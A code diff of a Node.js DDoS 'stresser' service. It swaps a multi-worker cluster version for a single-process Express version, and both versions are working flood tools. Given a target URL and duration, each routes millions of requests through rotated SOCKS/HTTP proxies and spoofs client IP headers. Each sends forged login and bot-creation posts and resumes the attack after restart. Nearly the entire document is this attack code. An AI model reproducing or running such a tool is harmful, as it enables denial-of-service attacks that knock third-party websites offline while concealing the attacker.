@@ -1,267 +1,267 @@
-const cluster = require('cluster');
-const os = require('os');
-const express = require('express');
-const { request } = require('undici');
-const fs = require('fs').promises;
-const path = require('path');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { rainbow } = require('gradient-string');
-const { fakeState } = require('./fakeState.js');
-const randomUseragent = require('random-useragent');
+const express = require("express");
+const axios = require("axios");
+const fs = require("fs");
+const path = require("path");
+const { SocksProxyAgent } = require("socks-proxy-agent");
+const { HttpsProxyAgent } = require("https-proxy-agent");
+const { rainbow } = require("gradient-string");
+const { fakeState } = require("./fakeState.js");
 
-const numCPUs = os.cpus().length;
-const DEFAULT_PORT = 25694;
-const WORKER_PORTS = Array.from({length: numCPUs}, (_, i) => DEFAULT_PORT + i);
+const app = express();
+app.use(express.json());
 
-if (cluster.isMaster) {
-    console.log(rainbow(`Master ${process.pid} is running`));
+const amount_requestsPerMS = 10000000; // Added constant for requests per millisecond
 
-    // Fork workers with sequential ports
-    WORKER_PORTS.forEach((port, i) => {
-        const worker = cluster.fork({ 
-            WORKER_PORT: port,
-            WORKER_TYPE: i === 0 ? 'MAIN' : 'ATTACK' 
-        });
-        
-        // Forward messages from workers to all other workers
-        worker.on('message', (msg) => {
-            for (const id in cluster.workers) {
-                if (cluster.workers[id] !== worker) {
-                    cluster.workers[id].send(msg);
-                }
+const stateFilePath = path.join(__dirname, 'attackState.json');
+
+const ensureStateFileExists = () => {
+    if (!fs.existsSync(stateFilePath)) {
+        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
+    }
+};
+
+const saveState = (state) => {
+    fs.writeFileSync(stateFilePath, JSON.stringify(state));
+};
+
+const loadState = () => {
+    ensureStateFileExists();
+    try {
+        const data = fs.readFileSync(stateFilePath, 'utf-8');
+        return JSON.parse(data);
+    } catch (error) {
+        console.error(`Failed to read state file: ${error}`);
+        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+    }
+};
+
+const initialState = loadState();
+let continueAttack = initialState.continueAttack;
+let startTime = initialState.startTime;
+let duration = initialState.duration;
+let targetUrl = initialState.targetUrl;
+
+if (continueAttack && startTime && duration) {
+    const endTime = startTime + duration;
+    if (Date.now() > endTime) {
+        continueAttack = false;
+    }
+}
+
+const langHeaders = [
+    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
+    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
+    "en-US,en;q=0.5",
+    "en-US,en;q=0.9",
+    "de-CH;q=0.7",
+    "da, en -gb;q=0.8, en;q=0.7",
+    "cs;q=0.5",
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+    "en-CA,en;q=0.9",
+    "en-AU,en;q=0.9",
+    "en-NZ,en;q=0.9",
+    "en-ZA,en;q=0.9"
+];
+
+const referrers = [
+    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
+    "http://coccoc.com/search#query=",
+    "http://ddosvn.somee.com/f5.php?v=",
+    "http://engadget.search.aol.com/search?q=",
+    "http://engadget.search.aol.com/search?q=query?=query=&q=",
+    "http://eu.battle.net/wow/en/search?q=",
+    "http://filehippo.com/search?q=",
+    "http://funnymama.com/search?q=",
+    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
+    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
+    "http://go.mail.ru/search?mail.ru=1&q=",
+    "http://help.baidu.com/searchResult?keywords=",
+    "https://net25.com/news"
+];
+
+const cipherSuites = [
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
+];
+
+const acceptHeaders = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+];
+
+const proxyFilePath = path.join(__dirname, "proxy.txt");
+const ualist = path.join(__dirname, "ua.txt");
+const maxRequests = Number.MAX_SAFE_INTEGER;
+const numThreads = 10000;
+
+const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
+const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
+
+const userAgents = () => {
+    try {
+        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
+    } catch (error) {
+        console.error(`Failed to read user agent list: ${error}`);
+        return [];
+    }
+};
+
+const loadProxies = () => {
+    try {
+        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
+    } catch {
+        return [];
+    }
+};
+
+const performAttack = (url, agent, continueAttack) => {
+    if (!continueAttack) return;
+
+    const headersForRequest = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
+        "Accept": getRandomElement(acceptHeaders),
+        "Accept-Language": getRandomElement(langHeaders),
+        "Cache-Control": getRandomElement(cipherSuites),
+        "Referer": getRandomElement(referrers),
+        "Connection": "keep-alive",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "TE": "Trailers",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Pragma": getRandomElement(cipherSuites),
+        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
+        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        "Host": url.replace(/https?:\/\//, "").split("/")[0],
+        "sec-fetch-site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Origin": url.split("/").slice(0, 3).join("/"),
+        "X-XSS-Protection": "1; mode=block",
+        "X-Frame-Options": "DENY",
+        "X-Content-Type-Options": "nosniff",
+        "If-None-Match": '"W/"5c-1f7b"',
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
+        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
+        "Accept-Charset": "utf-8",
+        "Expires": "0",
+        "X-Content-Security-Policy": "default-src 'self';",
+        "X-Download-Options": "noopen",
+        "X-DNS-Prefetch-Control": "off",
+        "X-Permitted-Cross-Domain-Policies": "none",
+        "X-Powered-By": "PHP/7.4.3",
+    };
+    
+    // Send multiple requests based on amount_requestsPerMS
+    for (let i = 0; i < amount_requestsPerMS; i++) {
+        axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/create", {
+            appstate: fakeState(),
+            botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
+            botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
+            botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
+            username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
+        })
+        .catch(() => {});
+    }
+    
+    for (let i = 0; i < amount_requestsPerMS; i++) {
+        axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
+            state: fakeState()
+        })
+        .catch(() => {});
+    }
+
+    for (let i = 0; i < amount_requestsPerMS; i++) {
+        axios.get(url, {
+            httpAgent: agent,
+            headers: headersForRequest,
+            timeout: 0,
+        })
+        .then(() => {})
+        .catch((err) => {
+            if (err.response?.status === 503) {
+                console.log(rainbow("Target under heavy load (503) - Game Over!"));
+            } else if (err.response?.status === 502) {
+                console.log(rainbow("Bad Gateway (502)."));
             }
-        });
-    });
-
-    cluster.on('exit', (worker, code, signal) => {
-        console.log(rainbow(`Worker ${worker.process.pid} died`));
-        const newWorker = cluster.fork({
-            WORKER_PORT: worker.process.env.WORKER_PORT,
-            WORKER_TYPE: worker.process.env.WORKER_TYPE
-        });
-    });
-} else {
-    const app = express();
-    app.use(express.json());
-
-    const stateFilePath = path.join(__dirname, 'attackState.json');
-    const proxyFilePath = path.join(__dirname, 'proxy.txt');
-    const port = parseInt(process.env.WORKER_PORT);
-    const isMainWorker = process.env.WORKER_TYPE === 'MAIN';
-
-    // Attack configuration
-    const numThreads = 10000;
-    const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
-    const requestsPerMethod = 1000000;
-
-    // State management
-    let attackState = {
-        continueAttack: false,
-        targetUrl: null,
-        startTime: null,
-        duration: null
-    };
-
-    const ensureStateFileExists = async () => {
-        try {
-            await fs.access(stateFilePath);
-        } catch {
-            await fs.writeFile(stateFilePath, JSON.stringify({
-                continueAttack: false,
-                targetUrl: null,
-                startTime: null,
-                duration: null
-            }));
-        }
-    };
-
-    const saveState = async (state) => {
-        try {
-            await fs.writeFile(stateFilePath, JSON.stringify(state, null, 2));
-        } catch (err) {
-            console.error(rainbow(`[${process.env.WORKER_TYPE}] Failed to save state:`), err);
-        }
-    };
-
-    const loadState = async () => {
-        await ensureStateFileExists();
-        try {
-            const data = await fs.readFile(stateFilePath, 'utf-8');
-            return JSON.parse(data);
-        } catch (err) {
-            console.error(rainbow(`[${process.env.WORKER_TYPE}] Failed to load state:`), err);
-            return {
-                continueAttack: false,
-                targetUrl: null,
-                startTime: null,
-                duration: null
-            };
-        }
-    };
-
-    const isValidUrl = (url) => {
-        try {
-            new URL(url);
-            return /^https?:\/\//i.test(url);
-        } catch {
-            return false;
-        }
-    };
-
-    // Attack functions
-    const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
-
-    const createHeaders = (url) => {
-        const urlObj = new URL(url);
-        const origin = `${urlObj.protocol}//${urlObj.host}`;
-        
-        return {
-            'User-Agent': randomUseragent.getRandom(),
-            'Accept': getRandomElement(['text/html', 'application/json', '*/*']),
-            'Accept-Language': getRandomElement(['en-US', 'fr-FR']),
-            'Origin': origin,
-            'Referer': origin,
-            'Connection': 'keep-alive',
-            'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
-        };
-    };
-
-    const loadProxies = async () => {
-        try {
-            const data = await fs.readFile(proxyFilePath, 'utf-8');
-            return data.split('\n').filter(line => line.trim());
-        } catch {
-            return [];
-        }
-    };
-
-    const performAttack = async (url, agent) => {
-        if (!attackState.continueAttack) return;
-
-        const headers = createHeaders(url);
-        const requests = [];
-
-        // Generate random requests
-        for (let i = 0; i < requestsPerMethod; i++) {
-            const method = getRandomElement(httpMethods);
-            requests.push(
-                request(url, {
-                    method,
-                    headers,
-                    dispatcher: agent,
-                    maxRedirections: 0
-                }).catch(() => {})
-            );
-
-            // For POST requests, add fake state
-            if (method === 'POST') {
-                requests.push(
-                    request(`${url}/login`, {
-                        method: 'POST',
-                        headers: { ...headers, 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ state: fakeState() }),
-                        dispatcher: agent,
-                        maxRedirections: 0
-                    }).catch(() => {})
-                );
-            }
-        }
-
-        await Promise.all(requests);
-        setImmediate(() => performAttack(url, agent));
-    };
-
-    const startAttack = async (url, durationHours) => {
-        if (!isValidUrl(url)) {
-            console.error(rainbow(`[${process.env.WORKER_TYPE}] Invalid URL`));
-            return;
-        }
-
-        const proxies = await loadProxies();
-        if (proxies.length === 0) {
-            console.error(rainbow(`[${process.env.WORKER_TYPE}] No proxies found`));
-            return;
-        }
-
-        // Update state
-        attackState = {
-            continueAttack: true,
-            targetUrl: url,
-            startTime: Date.now(),
-            duration: durationHours * 3600 * 1000
-        };
-
-        if (isMainWorker) {
-            await saveState(attackState);
-            process.send({ type: 'NEW_ATTACK', target: url, duration: durationHours });
-        }
-
-        // Set attack timeout
-        if (isMainWorker) {
-            setTimeout(() => {
-                attackState.continueAttack = false;
-                fs.unlink(stateFilePath).catch(() => {});
-                process.send({ type: 'STOP_ATTACK' });
-            }, attackState.duration);
-        }
-
-        // Start attack threads
-        const threadsPerWorker = Math.ceil(numThreads / numCPUs);
-        for (let i = 0; i < Math.min(threadsPerWorker, proxies.length); i++) {
-            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-            const agent = proxy.startsWith('socks') 
-                ? new SocksProxyAgent(proxy, { timeout: 5000 })
-                : new HttpsProxyAgent(proxy, { timeout: 5000 });
-            
-            performAttack(url, agent);
-        }
-    };
-
-    // API Endpoints (Main worker only)
-    if (isMainWorker) {
-        app.get('/stresser', async (req, res) => {
-            const { url, duration } = req.query;
-            const durationHours = parseFloat(duration) || 1;
-
-            if (!isValidUrl(url)) {
-                return res.status(400).json({ error: 'Invalid URL' });
-            }
-
-            res.json({ message: 'Attack started' });
-            await startAttack(url, durationHours);
         });
     }
 
-    // Worker communication
-    process.on('message', (msg) => {
-        if (msg.type === 'NEW_ATTACK') {
-            attackState = {
-                continueAttack: true,
-                targetUrl: msg.target,
-                startTime: Date.now(),
-                duration: msg.duration * 3600 * 1000
-            };
-            startAttack(msg.target, msg.duration);
-        } else if (msg.type === 'STOP_ATTACK') {
-            attackState.continueAttack = false;
-        }
-    });
+    setTimeout(() => performAttack(url, agent, continueAttack), 0);
+};
 
-    // Initialize
-    const init = async () => {
-        const state = await loadState();
-        if (state.continueAttack && isValidUrl(state.targetUrl)) {
-            const remainingTime = (state.startTime + state.duration - Date.now()) / 3600000;
-            if (remainingTime > 0) {
-                attackState = state;
-                startAttack(state.targetUrl, remainingTime);
-            }
-        }
-    };
+const updateState = () => {
+    saveState({ continueAttack, startTime, duration, targetUrl });
+};
 
-    app.listen(port, () => {
-        console.log(rainbow(`[${process.env.WORKER_TYPE}] Worker ${process.pid} running on port ${port}`));
-        init();
-    });
-}
+setInterval(updateState, 5000);
+
+const startAttack = (url, durationHours) => {
+    if (!url || !/^https?:\/\//.test(url)) {
+        console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
+        return;
+    }
+
+    const proxies = loadProxies();
+    if (!proxies.length) {
+        console.error("No proxies found. Please add proxies to the proxy file.");
+        return;
+    }
+
+    continueAttack = true;
+    targetUrl = url;
+    startTime = Date.now();
+    duration = durationHours * 60 * 60 * 1000; // convert hours to milliseconds
+
+    const attackTimeout = setTimeout(() => {
+        continueAttack = false;
+    }, duration);
+
+    for (let i = 0; i < numThreads; i++) {
+        if (!continueAttack) break;
+
+        const randomProxy = getRandomElement(proxies);
+        const proxyParts = randomProxy.split(":");
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
+
+        performAttack(url, agent, continueAttack);
+    }
+};
+
+app.get("/stresser", (req, res) => {
+    const url = req.query.url;
+    const durationHours = parseFloat(req.query.duration) || 1;
+    if (!url || !/^https?:\/\//.test(url)) {
+        return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
+    }
+    if (isNaN(durationHours) || durationHours <= 0) {
+        return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
+    }
+    targetUrl = url;
+    startAttack(targetUrl, durationHours);
+    res.json({ message: "Starting DDOS ATTACK..." });
+});
+
+const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
+app.listen(port, () => {
+    console.log(rainbow(`API running on http://localhost:${port}`));
+    if (continueAttack) {
+        console.log(rainbow('Resuming previous attack...'));
+        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // convert milliseconds back to hours
+        if (remainingDuration > 0) {
+            startAttack(targetUrl, remainingDuration);
+        }
+    }
+});
